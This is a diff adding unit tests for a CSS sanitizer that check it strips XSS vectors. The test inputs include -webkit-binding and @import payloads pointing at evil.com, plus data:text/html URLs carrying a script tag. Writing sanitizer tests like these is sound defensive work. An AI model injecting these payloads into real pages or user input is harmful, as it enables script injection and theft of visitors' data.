@@ -99,4 +99,46 @@ describe('sanitizeCss()', () => {
     expect(result).toContain('border-radius');
     expect(result).toContain('background-color');
   });
+
+  describe('추가 XSS 벡터 차단', () => {
+    it('-webkit-binding: → 차단', () => {
+      const result = sanitizeCss('-webkit-binding: url("http://evil.com/xss.xml")');
+      expect(result).not.toMatch(/-webkit-binding\s*:/i);
+    });
+
+    it('대소문자 혼합 -WEBKIT-BINDING: → 차단', () => {
+      const result = sanitizeCss('-WEBKIT-BINDING: url("http://evil.com/xss.xml")');
+      expect(result).not.toMatch(/-webkit-binding\s*:/i);
+    });
+
+    it('url(data:text/html,...) → 차단', () => {
+      const result = sanitizeCss('background: url(data:text/html,<script>alert(1)</script>)');
+      expect(result).not.toMatch(/url\s*\(\s*['"]?\s*data:/i);
+    });
+
+    it('url(data:application/...) → 차단', () => {
+      const result = sanitizeCss('content: url(data:application/x-shockwave-flash,evil)');
+      expect(result).not.toMatch(/url\s*\(\s*['"]?\s*data:/i);
+    });
+
+    it('@import url(...) → 차단', () => {
+      const result = sanitizeCss('@import url("http://evil.com/steal.css");');
+      expect(result).not.toMatch(/@import\b/i);
+    });
+
+    it('대소문자 혼합 @IMPORT → 차단', () => {
+      const result = sanitizeCss('@IMPORT "http://evil.com/steal.css";');
+      expect(result).not.toMatch(/@import\b/i);
+    });
+
+    it('모든 새 벡터 동시 존재 → 모두 차단', () => {
+      const malicious = `-webkit-binding: url(evil.xml);
+        background: url(data:text/html,<b>xss</b>);
+        @import url(evil.css);`;
+      const result = sanitizeCss(malicious);
+      expect(result).not.toMatch(/-webkit-binding\s*:/i);
+      expect(result).not.toMatch(/url\s*\(\s*['"]?\s*data:/i);
+      expect(result).not.toMatch(/@import\b/i);
+    });
+  });
 });
